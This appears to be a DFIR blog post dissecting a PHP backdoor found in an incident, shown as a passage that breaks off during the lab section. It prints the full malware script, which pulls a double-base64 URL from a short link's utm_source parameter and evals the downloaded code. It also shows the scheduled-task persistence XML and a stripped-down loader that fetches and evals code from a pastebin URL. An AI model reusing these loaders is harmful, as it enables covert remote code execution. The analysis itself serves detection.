---
title: Dissection of a PHP Backdoor leveraging php-win.exe
url: https://dfir.ch/posts/dissection_php_backdoor/
source: Over Security - Cybersecurity news aggregator
date: 2025-11-17
fetch_date: 2025-11-18T03:15:09.398002
---

# Dissection of a PHP Backdoor leveraging php-win.exe

[Home](https://dfir.ch/)
[ ]

Menu

* [Home](/)
* [Posts](/posts/)
* [Talks](/talks/)
* [Tweets](/tweets/)
* |

LIGHT

DARK

# Dissection of a PHP Backdoor leveraging php-win.exe

16 Nov 2025

**Table of Contents**

* [Introduction](#introduction)
* [Analysis of the PHP Backdoor](#analysis-of-the-php-backdoor)
* [Persistence](#persistence)
* [Lab Time & Detection](#lab-time--detection)
* [Conclusion](#conclusion)

## Introduction

During a recent Incident Response engagement, my colleague [Asger Deleuran Strunk](https://www.linkedin.com/in/asgerstrunk/) identified an unusual Scheduled Task while reviewing AutoRuns data from all servers and workstations across the network. The task, named `ClockLauncher`, referenced a batch file located at:

`C:\Windows\Temp\{0b1281f3-c9bc-4b85-ad92-0803ed04208f}\php_2\run-clock.bat`

Here is the content of the file `run-clock.bat`:

```
@echo off
cd /d "C:\Windows\Temp\{0B1281F3-C9BC-4B85-AD92-0803ED04208F}\php_2\"
"C:\Windows\Temp\{0B1281F3-C9BC-4B85-AD92-0803ED04208F}\php_2\php-win.exe" "C:\Windows\Temp\{0B1281F3-C9BC-4B85-AD92-0803ED04208F}\php_2\5.php"
exit
```

The executable `php-win.exe` is running `5.php` from a non-standard directory, `C:\Windows\Temp\{0B1281F3-C9BC-4B85-AD92-0803ED04208F}\php_2\`. The whole chain, starting from the filename to the directory, looks highly suspicious. Letâs investigate. ðµï¸ââï¸

## Analysis of the PHP Backdoor

Here is the content of the file `5.php`:

```
<?php
$mem = "";
while (true) {
sleep(rand(10, 30));
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://cutt.ly/praXEwzs');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_NOBODY, true);

$response = curl_exec($ch);
//echo $response;
if (curl_errno($ch)) {
    echo 'ÐÑÐ¸Ð±ÐºÐ° cURL: ' . curl_error($ch);
} else {
if (preg_match('/utm_source=([^\s&]+)/', $response, $matches)) {
    $utm_source = trim(preg_replace('/[^\x20-\x7E]/u', '', $matches[1]));
}
 if ($mem != $matches[1])
{
    if (isset($matches[1])) {
        $mem =$matches[1];
        $encodedUrlData = $matches[1];
        $decodedUrlData = urldecode($encodedUrlData);
        $decodedBase64Data = base64_decode($decodedUrlData);
        //echo $decodedBase64Data . PHP_EOL;
        if ($decodedBase64Data !== false) {
            $decodedBase64Data = base64_decode($decodedBase64Data);
            curl_setopt($ch, CURLOPT_URL, $decodedBase64Data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_NOBODY, false);
            $response = curl_exec($ch);
            //echo $response;
            eval('?>' . $response);
            //echo $decodedBase64Data . PHP_EOL;
        }
    }
}
}
curl_close($ch);
}
?>
```

In the first section of the script, `curl` is initialized. *cURL is a free and open source CLI app for uploading and downloading individual files. It can download a URL from a web server over HTTP, and supports a variety of other network protocols.* Several options are set:

* Requests only the headers (CURLOPT\_NOBODY).
* Follows redirects automatically (CURLOPT\_FOLLOWLOCATION).
* Specifies the URL to fetch (CURLOPT\_URL)

The script then executes the web request using `$response = curl_exec($ch)`, which retrieves the HTTP headers (such as `Location:`) for the short URL `https://cutt.ly/praXEwzs` specified in `CURLOPT_URL`. At this stage, `$response` contains all the HTTP headers returned by the server, potentially multiple sets if redirects were followed.

From these headers, the script searches for any line containing `utm_source=` and extracts the value following the equals sign. In this case, the value is obtained from a Location header associated with one of the redirects.

I created a new `cutt.ly` link, pointing to an older blog post of mine. I also set a `UTM code` (a campaign source) (depicted in Figure 1).

![cutt.ly UTM generator](/images/php_backdoor/utm_source_parameter.png "cutt.ly UTM generator")

Figure 1: cutt.ly UTM generator

Now, when I fetched that domain with `curl`, and only fetched the headers.. pay attention to the `Location:` header:

```
$ curl -I -L https://cutt.ly/Yr7EQmQa
HTTP/2 301
date: Tue, 28 Oct 2025 21:23:36 GMT
content-type: text/html; charset=UTF-8
location: https://dfir.ch/posts/sysrv/?utm_source=dfir.ch
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-cache, no-store, must-revalidate
```

There is the `utm_source` tag, the same as the malicious PHP script will parse out. Effectively, we can now set an inconvicence URL as the shortened URL, like Google, and set our payload as the `utm_source`. The PHP script then retrieves the HTTP headers, parses them, extracts the utm\_source value, URL-decodes it, performs a double Base64 decode, and finally downloads another payload from the URL reconstructed from that parameter.

The payload finally gets passed to the `eval` function (effectively compiles and runs whatever code you pass to it at runtime). A clever and stealthy approach.

## Persistence

In order to maintain persistence, the attacker created a scheduled task named `ClockLauncher` (C:\Windows\System32\Tasks\ClockLauncher). Following the shortened version of the Scheduled Task:

```
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2025-10-01T05:44:26</Date>
    <Author>COMPANY\ADM</Author>
    <URI>\ClockLauncher</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <StartBoundary>2025-04-01T05:44:00</StartBoundary>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>S-1-5-18</UserId>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>"C:\Windows\Temp\{0B1281F3-C9BC-4B85-AD92-0803ED04208F}\php_2\run-clock.bat"</Command>
    </Exec>
  </Actions>
</Task>
```

This scheduled task would run the `run-clock.bat` file, which in turn would execute the PHP file. In addition to the scheduled task, the attacker created another persistence mechanism, a service named `ClockSystemService`, configured to run under the `LocalSystem` account. The service was, however, stopped at the time of the investigation.

## Lab Time & Detection

The attentive reader might have spotted that the script uses `php-win.exe` instead of `php.exe`. `php.exe` invokes the `Conhost` terminal window when started. But that isn’t something `php.exe` does, it actually happens automatically because Windows recognizes that the `php.exe` file is marked as “console application”. It will always get launched in a console, whether it’s one inherited from `cmd.exe` (when running a .bat script) or whether it’s a new one (when double-clicking `php.exe`).

So `php-win.exe` is almost exactly the same thing, but the .exe file is not marked as “console”, it’s marked as “GUI application” instead, and will run completely invisible (unless you use it to run a script that e.g. calls PHP-GTK or PHP/Tk to create GUI windows). Well, not completely invisible, as we will see shortly.

I created a stripped down version of the backdoor for testing purposes. Within the PHP.ini file, you have to uncomment the following line to enable `curl`:

```
extension=curl
```

And here is the stripped down version of the backdoor. I deliberately avoided obfuscation techniques such as base64, as we do not want to test network-based monitoring, but rather host-based monitoring. That is why the code is fetched directly, without the additional detours from the original backdoor.

```
<?php

$ch = curl_init();
$pastebin_url = "https://pastebin.com/raw/HZTqJLAs";
curl_setopt($ch, CURLOPT_URL, $pastebin_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

eval($response);

curl_close($ch);

?>
```

First, I used the si...